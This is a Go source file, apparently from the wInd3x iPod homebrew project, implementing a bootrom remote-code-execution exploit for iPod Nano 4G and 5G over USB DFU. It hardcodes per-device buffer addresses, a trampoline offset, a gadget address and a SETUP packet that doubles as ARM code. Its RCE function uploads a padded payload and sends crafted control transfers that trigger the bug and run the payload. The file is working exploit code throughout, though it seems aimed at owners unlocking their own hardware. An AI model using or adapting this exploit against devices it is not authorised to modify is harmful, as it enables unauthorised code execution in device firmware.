package exploit

import (
	"bytes"
	"fmt"
	"log"
	"time"

	"github.com/freemyipod/wInd3x/pkg/devices"
	"github.com/freemyipod/wInd3x/pkg/dfu"

	"github.com/google/gousb"
)

type Parameters struct {
	// Address of the DFU data buffer.
	DFUBufAddr uint32
	// Address at which payload begins execution, within the DFU data buffer,
	// as jumped into by the SetupPacket.
	ExecAddr uint32
	// Address of the USB DMA buffer, ie. the SETUP packet currently being
	// processed.
	USBBufAddr uint32
	// Address to return to from handler.
	ReturnAddr uint32
	// Address of trampoline in bootrom, jumped to by handler.
	TrampolineAddr uint16
	// Setup packet to be sent. This must also be valid ARM code, as it happens
	// to be executed.
	SetupPacket []byte
	// Address of 'mov r0, #1; bx lr' gadget.
	Ret1Addr uint32
}

var ParametersForKind = map[devices.Kind]*Parameters{
	devices.Nano4: &Parameters{
		DFUBufAddr:     0x2202db00,
		ExecAddr:       0x2202dc08,
		USBBufAddr:     0x2202e300,
		ReturnAddr:     0x20004d64,
		TrampolineAddr: 0x3b0,
		// b 0x2202dc08
		SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000d10,
	},
	devices.Nano5: &Parameters{
		DFUBufAddr:     0x2202db00,
		ExecAddr:       0x2202dc08,
		USBBufAddr:     0x2202e300,
		ReturnAddr:     0x20004d70,
		TrampolineAddr: 0x37c,
		// b 0x2202dc08
		SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000cbc,
	},
}

func RCE(usb *gousb.Device, ep *Parameters, payload []byte) error {
	usb.ControlTimeout = time.Second

	// Prepend payload with enough bytes to start at ExecAddr.
	pad := bytes.Repeat([]byte{'Z'}, int(ep.ExecAddr-ep.DFUBufAddr))
	payload = append(pad, payload...)

	// Upload payload into DFU buffer, and reset status afterwards.
	if len(payload) > 0x400 {
		return fmt.Errorf("payload too large (%d > %d)", len(payload), 0x400)
	}
	log.Printf("Sending payload to DFU buffer (%d bytes)...", len(payload))
	if err := dfu.SendChunk(usb, payload, 0); err != nil {
		return fmt.Errorf("Upload: %w", err)
	}
	log.Printf("Cleaning state after send...")
	if err := dfu.Clean(usb); err != nil {
		return fmt.Errorf("clean: %w", err)
	}

	log.Printf("Triggering first receive...")
	buf := make([]byte, 0x40)
	if _, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf); err != nil {
		return fmt.Errorf("first upload failed: %v", err)
	}

	// Start a download of X+0x40 bytes, this will only send 0x40 bytes
	// (for some reason large control transfers don't work?), causing a state
	// structure field to be set to X.
	// X = TrampolineAddr, which is 0x3b0 for Nano 4G and 0x37c for Nano 5G
	log.Printf("Triggering second receive...")
	l := ep.TrampolineAddr + 0x40
	buf = make([]byte, l)
	_, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf)
	if want, got := gousb.ErrorTimeout, err; want != got {
		return fmt.Errorf("upload trigger should have returned %v, got %v", want, got)
	}

	// Trigger bug. This should get the payload executing.
	log.Printf("Triggering bug...")
	bmRequestType := ep.SetupPacket[0]
	bRequest := ep.SetupPacket[1]
	wValue := uint16(ep.SetupPacket[2]) | (uint16(ep.SetupPacket[3]) << 8)
	wIndex := uint16(ep.SetupPacket[4]) | (uint16(ep.SetupPacket[5]) << 8)
	_, err = usb.Control(bmRequestType, bRequest, wValue, wIndex, nil)
	if want, got := gousb.ErrorTimeout, err; want != got {
		return fmt.Errorf("bug trigger should have returned %v, got %v", want, got)
	}

	return nil

}
